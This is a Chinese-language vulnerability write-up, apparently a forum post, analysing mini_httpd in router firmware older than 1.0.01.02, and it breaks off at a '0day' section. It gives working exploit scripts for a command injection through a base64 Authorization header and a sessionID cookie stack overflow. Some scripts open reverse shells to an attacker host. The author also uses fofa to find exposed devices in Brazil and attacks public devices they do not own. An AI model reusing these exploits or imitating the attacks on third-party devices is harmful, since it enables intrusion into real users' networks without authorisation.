
```shell
BusyBox v1.23.2 (2020-08-17 10:59:42 IST) built-in shell (ash)
/ # LD\_PRELOAD="/hook" ./usr/sbin/mini\_httpd
bind: Address already in use
/ # ./usr/sbin/mini\_httpd: started as root without requesting chroot(), warning only
/ # ps |grep mini\_httpd
2364 root 3540 S ./usr/sbin/mini\_httpd
2369 root 3120 S grep mini\_httpd
```

可以看到服务跑起来了，访问试试

![](upload/attach/202108/793907_K6S3BUBDGXTSJ48.png)

根据403字符定位到程序中

![](./upload/attach/202108/793907_5MF9RSU2BN8MJXG.png)

![](./upload/attach/202108/793907_JBJ3KAVY6Z29U8A.png)

执行`sub_1b5f0`函数后就退出了，猜测是某些环境变量的问题，这里为了不改变代码逻辑，我直接`patch` `mini_httpd`程序代码块，把跳转 `sub_1B5F0`的地方`nop`掉

![before_nop](./upload/attach/202108/793907_DYG3EWZRRY325UJ.png)

![nop](./upload/attach/202108/793907_KWYUX2P9WYP3UAF.png)

再次执行程序后访问`web`

![](upload/attach/202108/793907_DER4FNUC2CSMGC6.png)

# 固件逆向分析与调试

接下来就是对`mini_httpd`的详细逆向过程，其实就是寻找触发路径。

## 命令注入漏洞分析

我把漏洞触发函数改成了`vuln`，以及调用`vuln`的上层函数`vuln_back1`，上上层函数`vuln_back2`........

![](./upload/attach/202108/793907_XQBD3YMRM7KVHMM.png)

### vuln_back2

在`vuln_back2`中看出，我们只需要`contrl_arg`字符串里面包含`"dniapi/"`即可进入`vuln_back1`

![vuln_back2](./upload/attach/202108/793907_XT8B545MEGRV3QU.png)

在往上看，`contrl_arg`被赋值成`dword_34F60 + 1`，并且`dword_34F60`第一个字符必须为`'/'`，这里可以猜测`contrl_arg`是一个请求行的`URL`

![vuln_back2](./upload/attach/202108/793907_MS2H2GRGAPP2WTR.png)

为了验证我的猜测，动态调试一下，由于所有的请求都被放在了`fork`子进程中处理。我这里暂时为了方便调试，`hook`了`fork`函数返回`0`，构造了`GET /hello.txt`

![](./upload/attach/202108/793907_GDENSCCMFN92XJV.png)

![](./upload/attach/202108/793907_5HHUM9TWQ3H2YBM.png)

![](./upload/attach/202108/793907_2B97Q8ZST39PQPU.png)

### vuln_back1

在`vuln_back1`中判断了`contrl_arg`是否是相关字符，不是就会去执行`vuln`，调用`vuln`时传入了`contrl_arg`这个参数

![vuln_back1](./upload/attach/202108/793907_NQS9AGD62F298SF.png)

### vuln

`vuln`函数里面还有最后一层判断，必须让`contrl_arg`的前9个字符等于`"download/"`

![vuln](./upload/attach/202108/793907_A69T4PVGGS6TY9G.png)

所以综上，我们可以构造`GET`请求`URL`为`"/download/dniapi/"`，为了能触发`system`函数，我还需要调整`contrl_cmd`的值为`"Basic "`

查找引用，发现在`vuln_back2`函数中给`contrl_cmd`赋值

![vuln_back2](./upload/attach/202108/793907_6F8ZXH4ETPXT8WA.png)

大胆猜测，这里就是`HTTP`的`head`的`Authorization`字段

综上，最终能触发到`system`函数的请求大致如下

```shell
GET /download/dniapi/ HTTP/1.1
Authorization: Basic xxxxxxxxxxxxxxxxxxxxxxxxx
```

`vuln`通过`sub_1E19C`函数处理`contrl_cmd + 6`（`Basic `之后的字符串），结果放入`v5`，最终将`v5`作为拼接命令的一部分。

![](./upload/attach/202108/793907_YE9AMW5Q4E5W87G.png)

![table](./upload/attach/202108/793907_4SBH57FFKAGAY7S.png)

3字节一组，以及明显的`base64`解码字符表，经验证`sub_1E19C`就是`base64`解密函数。

所以只需要将请求`Authorization: Basic `后的字符换成想要执行命令的`base64`编码形式，同时用`;`字符截断原有的`curl`命令，就可以执行任意命令，下面以`date`命令为例。

![](./upload/attach/202108/793907_8RAWTT98WV249U3.png)

![](./upload/attach/202108/793907_VFR72653MQXVM63.png)

## Command Inject EXP

```python
# affect firmware version <1.0.01.02
import requests
import sys
import base64
import urllib3
if len(sys.argv)!=3:
print "Parameter error. python exp.py url \"command\""
exit(0)
url = sys.argv[1]
cmd = sys.argv[2]
CMD=";"+cmd+";"
CMD=base64.b64encode(CMD)
header = {'Authorization':"Basic "+CMD}
urllib3.disable_warnings()
if url[-1:]=='/':
url=url[:-1]
r = requests.get(url+"/download/dniapi/", headers=header,verify=False)
print "DONE!"
```

## 栈溢出漏洞分析

同样我将漏洞触发函数重命名成`overflow`，上层函数`overflow_back1`、`overflow_back2`

在`vuln_back2`函数里，处理 `cookie` 并且作为参数传入`overflow_back2`函数。

![](./upload/attach/202108/793907_453VZPBDGCTB7AN.png)

![](./upload/attach/202108/793907_7JSHUKAWT5CZ9WQ.png)

在这之前会有一个`check`，检查当前请求的`url`资源内容是否是需要登录才能访问

![](./upload/attach/202108/793907_CUB4BTCMHRC6TTA.png)

所以这里需要请求这些资源，使其返回`1`。

![](./upload/attach/202108/793907_64U3WRWYFPPB5BJ.png)

`overflow_back2`里判断`cookie`不为空后进入`overflow_back1`

![](./upload/attach/202108/793907_N8MUJCWW5V46F2T.png)

然后就是检索`cookie`是否包含`sessionID`，包含的话，将其以空格分隔后，传入`overflow`函数

![](./upload/attach/202108/793907_BXATSZ9JD4ATFUC.png)

`overflow`函数中形参`a2`指向空字符，所以其实最后就是未限制`sessionID`长度在`strcpy`时的溢出。

![](./upload/attach/202108/793907_FFNRJVEJVPREB4X.png)

POC如下：

```python
import requests
import urllib3
import sys
url = sys.argv[1]
if url[-1:]=='/':
url=url[:-1]
cmd="aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac"
payload = "sessionID="+cmd
urllib3.disable_warnings()
url= url+"/help"
head= {'Cookie':payload}
r=requests.get(url,headers=head,verify=False)
print(r)
print(r.text)
print(r.content)
```

![](./upload/attach/202108/793907_WEAH89B8WJGGTSJ.png)

分析`crash`结果，得知是在`overflow`函数返回前抛出的内存引用异常。原因是数据过长，覆盖了压入栈中的第五个参数`a5`，它刚好位于返回地址下方，导致最后一个`strcpy`往`a5`变量地址写数据时，该地址不合法。

所以为了能够保证利用，需要刚好覆盖到`overflow`函数的返回地址。

经过调试，测得偏移为`268`,POC如下：

```python
import requests
import urllib3
import sys
url = sys.argv[1]
if url[-1:]=='/':
url=url[:-1]
payload = "sessionID=1234".ljust(268,"a")+"bbb"
urllib3.disable_warnings()
url= url+"/help"
head= {'Cookie':payload}
r=requests.get(url,headers=head,verify=False)
print(r)
print(r.text)
print(r.content)
```

![](upload/attach/202108/793907_94WE7N9SGUUK8KK.png)

![](upload/attach/202108/793907_DKGG4SEZ43EWV4D.png)

可以看到返回地址被覆盖成了`bbb`（`0x626262`），且可以观察到此时的`r0`寄存器指向`sessionID=`后的字符串`1234...`，因此可以在`sessionID=`后放置命令字符串，然后控制`PC`跳转到`system`函数上。由于`cookie`在`overflow_back1`函数中被过滤了空格，在`overflow`中被过滤了等号，导致命令执行受限，空格可以用`${IFS}`替换，等号只能避免使用了。

![](./upload/attach/202108/793907_P546WWX8XGJ6K44.png)

## Stack Overflow EXP

关于`system`执行命令，我并不想去另寻僻径去`ROP`或者是上传后门程序，我尝试了很多技巧，最终以这种较为简单且通用的方式弹`shell`（输入与输出分离）。

```python
# affect firmware version <1.0.01.02
import requests
import urllib3
import sys
if len(sys.argv)!=5:
print "Parameter error. python exp.py url reverse_shell_host input_port output_port"
exit(0)
url = sys.argv[1]
reverse_shell_host = sys.argv[2]
input_port= sys.argv[3]
output_port= sys.argv[4]
if url[-1:]=='/':
url=url[:-1]
cmd="telnet "+reverse_shell_host+" "+input_port+" | /bin/sh | telnet "+reverse_shell_host+" "+output_port
cmd2=cmd.replace(' ',"${IFS}")
payload = ("sessionID="+cmd2+";").ljust(268,"a")
payload += "\x1c\xb1\x01"
urllib3.disable_warnings()
url= url+"/help"
head= {'Cookie':payload}
r=requests.post(url,headers=head,verify=False)
print(r)
print(r.text)
print(r.content)
```

# 本地测试

以`Command Inject EXP`为例：

```shell
python exp.py http://192.168.122.12 "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.122.11",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
```

![](./upload/attach/202108/793907_2N6ZX9PSPM6XXNB.png)

# 真实设备测试

由于我手里没有真实设备,只能找一些公网上的设备验证。

用`burpsuit`抓包获取设备特征

![](./upload/attach/202108/793907_FNWHR3QMJ96WGE9.png)

`Content-Security-Policy:`是一个很明显的特征

在`fofa`上搜索 `header="frame-ancestors 'self' 'unsafe-inline' 'unsafe-eval'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline' 'unsafe-eval'"`

我这里只搜索了巴西的

![](./upload/attach/202108/793907_Y57VZTAV5YZ2HPZ.png)

用`exp`打来试试

![](./upload/attach/202108/793907_ZGKV8SGN6U2XC2F.png)

# 收获0day

一开始我补丁比较的时候就发现，`v1.0.01.02`固件在`sprintf`之前加入了字符过滤函数

![](./upload/attach/202108/793907_J27AQFX2MQS4GX8.png)

该函数完整代码如下
